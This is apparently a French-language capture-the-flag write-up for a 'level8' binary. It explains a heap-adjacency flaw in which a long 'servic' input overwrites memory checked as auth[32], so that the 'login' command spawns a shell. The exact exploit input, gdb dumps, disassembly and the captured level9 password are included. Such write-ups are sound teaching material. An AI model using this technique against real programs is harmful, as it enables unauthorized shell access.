@@ -1,0 +1,68 @@
+le programme attend les commandes suivantes:
+	- auth <name>
+		copy <name> si sa len <= 30, stock dans la variable auth
+	- reset
+		free p1
+	- servic<content>
+		et pas service (!), strdup <content> (en fait "servic" + 7) dans la variable service
+	- login
+		si (auth[32] == 0), print "Password:\n", sinon call system("bin/bash"). (??)
+
+Il faudais donc envoyer une chaine de plus de 32char dans auth, mais le programme accepte suelement des chaines de 30char.
+Quand on regarde le code asm, on voit qu'il fait un malloc(4) pour la variable auth:
+	0x080485e4 <+128>:   movl   $0x4,(%esp)
+	0x080485eb <+135>:   call   0x8048470 <malloc@plt>			; call <malloc@plt>
+Cela veut dire que le strdup de la commande servic sera alloué juste derriere dans la memoire:
+	$ ./level8
+	> auth hi
+	0x804a008, (nil)
+	> servic AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKK
+	0x804a008, 0x804a018
+
+0x804a008 : addresse pointee par auth
+0x804a018 : addresse pointee par service
+En regardant auth[32] on a donc 0x45 (E):
+	(gdb) x/64x 0x804a008
+	0x804a008:      0x68    0x69    0x0a    0x00    0x00    0x00    0x00    0x00
+	0x804a010:      0x00    0x00    0x00    0x00    0x39    0x00    0x00    0x00
+	0x804a018:      0x41    0x41    0x41    0x41    0x42    0x42    0x42    0x42
+	0x804a020:      0x43    0x43    0x43    0x43    0x44    0x44    0x44    0x44
+	0x804a028:      0x45    0x45    0x45    0x45   	 0x46    0x46    0x46    0x46
+	0x804a030:      0x47    0x47    0x47    0x47    0x48    0x48    0x48    0x48
+	0x804a038:      0x49    0x49    0x49    0x49    0x4a    0x4a    0x4a    0x4a
+	0x804a040:      0x4b    0x4b    0x4b    0x4b    0x0a    0x00    0x00    0x00
+
+Ce qui nous permet de passer le check pour lancer le shell avec la commande login:
+   0x080486e2 <+382>:   mov    0x8049aac,%eax					; 0x8049aac <auth>
+   0x080486e7 <+387>:   mov    0x20(%eax),%eax					; auth[32]
+   0x080486ea <+390>:   test   %eax,%eax						; == 0 ?
+   0x080486ec <+392>:   je     0x80486ff <main+411>				; si oui jump un peu plus loin
+   0x080486ee <+394>:   movl   $0x8048833,(%esp)				; "/bin/sh"
+   0x080486f5 <+401>:   call   0x8048480 <system@plt>			; call <system@plt>
+
+On atterit donc dans un shell en tant que level9, on cat le .pass:
+	$ ./level8
+	> auth hi
+	0x804a008, (nil)
+	> servic AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKK
+	0x804a008, 0x804a018
+	> login
+	$ cat /home/user/level9/.pass
+	c542e581c5ba5162a85f767996e3247ed619ef6c6f7b76a59435545dc6259f8a
+
+
+====== LOGS GDB ==================================================================================
+0x804a008 + 0x20 = 0x804a028
+
+(gdb) x/s 0x804a028
+0x804a028:       "EEEEFFFFGGGGHHHHIIIIJJJJKKKK\n"
+
+(gdb) x/64c 0x804a008
+0x804a008:      72 'H'  105 'i' 10 '\n' 0 '\0'  0 '\0'  0 '\0'  0 '\0'  0 '\0'
+0x804a010:      0 '\0'  0 '\0'  0 '\0'  0 '\0'  57 '9'  0 '\0'  0 '\0'  0 '\0'
+0x804a018:      65 'A'  65 'A'  65 'A'  65 'A'  66 'B'  66 'B'  66 'B'  66 'B'
+0x804a020:      67 'C'  67 'C'  67 'C'  67 'C'  68 'D'  68 'D'  68 'D'  68 'D'
+0x804a028:      69 'E'  69 'E'  69 'E'  69 'E'  70 'F'  70 'F'  70 'F'  70 'F'
+0x804a030:      71 'G'  71 'G'  71 'G'  71 'G'  72 'H'  72 'H'  72 'H'  72 'H'
+0x804a038:      73 'I'  73 'I'  73 'I'  73 'I'  74 'J'  74 'J'  74 'J'  74 'J'
+0x804a040:      75 'K'  75 'K'  75 'K'  75 'K'  10 '\n' 0 '\0'  0 '\0'  0 '\0'
